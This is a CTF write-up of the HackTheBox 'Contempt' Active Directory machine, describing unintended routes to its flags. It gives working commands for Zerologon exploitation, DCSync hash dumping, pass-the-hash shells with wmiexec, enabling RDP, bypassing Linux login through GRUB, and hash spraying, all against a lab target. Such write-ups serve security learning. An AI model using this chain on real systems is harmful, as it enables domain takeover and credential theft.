## Context

Contempt was a hard-rated Active Directory machine from the HackTheBox Business CTF 2023. This write-up explains how I found two unintended paths that let me get the root flag really quickly, both on **contempt** and on **contempt - revenge** (which was supposed to fix the unintended path).

## Contempt

### Recon

#### Ports

As always when facing a HackTheBox machine, we need to enumerate it. To do so, I'll use [rustscan](https://github.com/RustScan/RustScan/), which is basically an nmap wrapper.
This tool is useful because it first scans for open ports, then lets you run the classic nmap options. It is more optimized than a basic nmap scan.

```bash
rustscan -a 10.129.235.160 -- -T4 -sVC -Pn -oN scan/nmap.md
```

![rustscan output listing open ports on the domain controller](../../../assets/blog/contempt-fullpwn/rustscan-ports.png)

Here we can see a bunch of ports, and we can already get a clear idea of what we have here.
- 53: DNS
- 88: Kerberos
- 135: RPC
- 139: NetBIOS
- 445: SMB
- 389 / 636 / 3268 / 3269: LDAP(s)

We can confidently say that we are dealing with a Windows Active Directory.

[2179](https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xhtml?search=2179)? I had never seen this before. What is this?

![Search result for port 2179 associated with Hyper-V](../../../assets/blog/contempt-fullpwn/hyperv-port-lookup.png)

Alright, we might have to deal with some Hyper-V. Let's keep that in mind.

#### FQDN

When attacking Active Directory, we always need to resolve its fully qualified domain name since this is how some protocols communicate.

The first thing we want to do is enumerate the domain name, the machine name, and whether we have access to any features or information.

To do so, I ran [enum4linux-ng](https://github.com/cddmp/enum4linux-ng). It allows us to try different credentials, such as anonymous or guest logins.

```bash
enum4linux-ng -A 10.129.235.160
```

![enum4linux-ng output revealing the contempt.htb domain and dc01 host](../../../assets/blog/contempt-fullpwn/enum4linux-domain.png)

Let's add those FQDNs to our hosts file like so:

```text
10.129.235.160 dc01 dc01.contempt.htb contempt.htb
```

We can note multiple things from here:
- Computer name: dc01
- Domain name: contempt.htb
- The domain SID (could be useful for some attack paths)
- OS version: Windows 2016 10.0

Windows Server 2016? 🤔
This is not brand new lmao.

### Root

#### Zerologon (CVE-2020-1472)

Zerologon is a well-known vulnerability that was disclosed in September 2020. It exploits the NetLogon protocol. This protocol opens remote sessions through RPC calls, but it also allows a computer to update its domain computer password from a domain controller. Because of a weak cryptographic configuration, we can set all the challenges to `00000000000000000000000000000000` and impersonate the call that changes the password of the computer domain account.

This is what we'll do here: empty the password of the `DC01$` domain account. Accounts that end with `$` are domain machine accounts.

```bash
wget https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/cve-2020-1472-exploit.py
python3 cve-2020-1472-exploit.py DC01 10.129.235.160
```

So we can now log in using `DC01$` as if it were a normal user and list the shares.

```bash
crackmapexec smb dc01.contempt.htb -d 'contempt.htb' -u 'DC01$' -p '' --shares
```

![SMB shares accessible with the DC01 machine account and an empty password](../../../assets/blog/contempt-fullpwn/smb-shares-dc01.png)


This means that our exploit worked properly. Unfortunately, nothing interesting here. I also tried to see if there was a GPO stored in the `SYSVOL` share with an encrypted password in it.

```bash
crackmapexec smb dc01.contempt.htb -d 'contempt.htb' -u 'DC01$' -p '' -M gpp_password
```

![crackmapexec gpp_password module with no password found](../../../assets/blog/contempt-fullpwn/gpp-password-none.png)

But no passwords.

#### DCSync using empty DC01$

One very useful trick, now that we have the machine account, is that we have the extended privileges `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`. This means that we can use DCSync to retrieve data from the domain controller, such as:
- Domain account username & hashes
- Kerberos keys
- Passwords stored using reversible encryption
- LSA secrets

```bash
crackmapexec smb dc01 -u 'DC01$' -p '' --ntds
```

![NTDS dump launched with the DC01 machine account](../../../assets/blog/contempt-fullpwn/ntds-dump.png)

We now have all the hashes, so we can impersonate anyone we want using pass-the-hash.

![Hashes recovered after DCSync on the domain controller](../../../assets/blog/contempt-fullpwn/hashes-dcsync.jpg)


#### Getting a shell

Let's grab the most privileged user: Administrator. Since I did not see the WinRM port the first time, we need to enumerate the SMB shares to see if we have access to `C$`.

```bash
crackmapexec smb dc01.contempt.htb -d 'contempt.htb' -u 'Administrator' -H '8845ad387f66869ab9768c8a7b08b36f' --shares
```

![SMB enumeration with the Administrator hash showing NETLOGON access](../../../assets/blog/contempt-fullpwn/smb-netlogon-access.png)

No `C$` here, but no worries. We have **write** permission on `NETLOGON`! So we can use, for example, `wmiexec.py` from [impacket](https://github.com/fortra/impacket).

```bash
wmiexec.py 'contempt.htb/Administrator@dc01.contempt.htb' -hashes ':8845ad387f66869ab9768c8a7b08b36f' -dc-ip 10.129.235.160 -share NETLOGON -shell-type powershell
```

![PowerShell shell obtained with wmiexec through the NETLOGON share](../../../assets/blog/contempt-fullpwn/wmiexec-shell.png)

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

![Reading root.txt on the Administrator desktop](../../../assets/blog/contempt-fullpwn/root-txt-desktop.png)

Hmmm, this is not very common. Usually when playing HackTheBox, you first get `user.txt`, then `root.txt` once you've finished the box!
Since I cannot locate `user.txt` on the machine, I ask the admins.

![Message asking admins where user.txt is located](../../../assets/blog/contempt-fullpwn/discord-user-txt.png)

Not on the Windows filesystem? 🤔


### User

#### Recon

Since we do not yet know where `user.txt` is located, let's do some enumeration again.

We could use the crackmapexec ioxidresolver module to scan the active interfaces of the machine. Maybe there is another machine in the internal network.

```bash
crackmapexec smb dc01.contempt.htb -u 'Administrator' -H '8845ad387f66869ab9768c8a7b08b36f' -M ioxidresolver
```

![ioxidresolver module revealing additional network interfaces](../../../assets/blog/contempt-fullpwn/oxidresolver-interfaces.png)

Alright, it makes sense: we need to find a Linux system, but we're on a Windows machine. So there are two hypotheses:
- There is another machine only reachable through the DC
- The Linux system is virtualized on the Active Directory

Remember the ports discovered at the beginning? Remember port 2179? We said there was probably a Hyper-V virtual machine involved.

While doing the box, I first saw an interesting directory:

![Interesting directory discovered during enumeration](../../../assets/blog/contempt-fullpwn/nextcloud-directory.png)

In this directory, we found the Nextcloud configuration.

![Nextcloud configuration revealing the internal address 172.16.20.1](../../../assets/blog/contempt-fullpwn/nextcloud-config-internal-ip.png)

There is a reverse proxy that redirects `nextcloud.contempt.htb` to `172.16.20.1`. If you remember correctly, I did not have port 443 in my first nmap scan, so I missed that one. That miss made me think of using Zerologon, because I did not find a suitable attack surface.

Alright, but how do we get into the VM? We can use Hyper-V Manager, but we need GUI access.

#### Enable RDP

We'll enable RDP and open the right port, since we did not see port 3389 in our nmap results.

```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
```

#### Add your account to Remote Desktop Users

Since our user is Enterprise Admin, we can RDP without doing anything. But if we were a normal user or just Domain Admin, we might have to add our user to `Remote Desktop Users` like this:

```powershell
net localgroup "Remote Management Users" echo.rivers /add
```

#### Log into the machine using RDP

But if you try to log into the machine using pass-the-hash, it will throw an error saying that you cannot log into the machine with a blank password.

![RDP error indicating that an empty password cannot be used to connect](../../../assets/blog/contempt-fullpwn/rdp-empty-password-error.png)

In that case, you can do two things:
- Change the policy to accept empty password logins
- Change the user password

The second one is the fastest since I know the command:

```powershell
net user Administrator JaiEnfinFiniMonDonjonDiabl0!
```

Now we can log into the machine using xfreerdp:

```bash
xfreerdp /v:'dc01' /d:'contempt.htb' /u:'Administrator' /p:'JaiEnfinFiniMonDonjonDiabl0!' +clipboard /dynamic-resolution /cert:ignore
```

#### Get into Hyper-V Manager

To reach the right panel, we'll do this:

`Windows -> Server Manager -> Tools -> HyperV Manager`

![Hyper-V Manager showing the nextcloud virtual machine](../../../assets/blog/contempt-fullpwn/hyperv-manager-vm.png)

Here we have our Nextcloud VM!

![nextcloud VM console asking for credentials](../../../assets/blog/contempt-fullpwn/vm-console-credentials.png)

But it asks for credentials in the CLI, so I started struggling a lot. I misclicked on the "Checkpoint" feature, which creates a snapshot, and made the VM unusable. So I decided to erase the checkpoint and restart the machine. I then saw the GRUB loader.

#### Bypass authentication

I then remembered a [Root-Me challenge](http://root-me.org/) that I solved a while ago. It is possible to bypass authentication on a machine if GRUB is installed and the bootloader is not encrypted, by following [this article](https://memo-linux.com/grub2-contourner-lauthentification-linux-mot-de-passe-utilisateur-ou-root-oublie/).

At GRUB startup, press "e" to edit the startup config. Then add `init=/bin/bash` after the first UUID. Save the configuration using `Ctrl + x`.

Continue the boot so you have a root shell.

```bash
cat /root/user.txt
```

![Linux root shell reading the user.txt file](../../../assets/blog/contempt-fullpwn/grub-root-shell-user-txt.png)

### Root

Since we already have a lot of information from the previous machine, if we are lucky enough, we can reuse it!

#### Hash spraying

It is time to spray some hashes using crackmapexec.

```bash
crackmapexec smb dc01.contempt.htb -u domain_users.txt -H '6c8f447c25487adc9148b0a90036c6a8'
```

![Hash spraying with the Administrator hash without success](../../../assets/blog/contempt-fullpwn/hash-spray-admin-fail.png)

Alright, so the Administrator hash is not working on any users. Let's try other users, for example the hash of a domain user that does not have any special rights.

```bash
crackmapexec smb dc01.contempt.htb -u domain_users.txt -H '2f320b121f6ae368a35ba9819e0d2516' --continue-on-success
```

![Hash spraying with a user hash and continue-on-success](../../../assets/blog/contempt-fullpwn/hash-spray-user-success.png)

![crackmapexec result showing valid credentials](../../../assets/blog/contempt-fullpwn/crackmapexec-valid-creds.jpg)

Since we know from the previous machine that `aria.frost` and `echo.rivers` are domain admins, let's see if we can get Domain Admin access.

![Pwn3d result indicating local administrator access](../../../assets/blog/contempt-fullpwn/pwn3d-local-admin.png)

The **Pwn3d!** means that we are also local admin of the machine. Game over, we can just repeat the previous exploit steps from [getting a shell](#getting-a-shell).

## To conclude

It is always fun to find an unintended path in a CTF challenge. But we cannot blame the challenge maker: it is always hard to think about every possible exploit path.

Even if you make a hotfix while the CTF is running, you cannot be sure that you've fixed the unintended paths.

Indeed, after the release of the intended solution, I must admit that I'm glad those fun unintended paths existed, because I enjoyed doing the box that way 😊
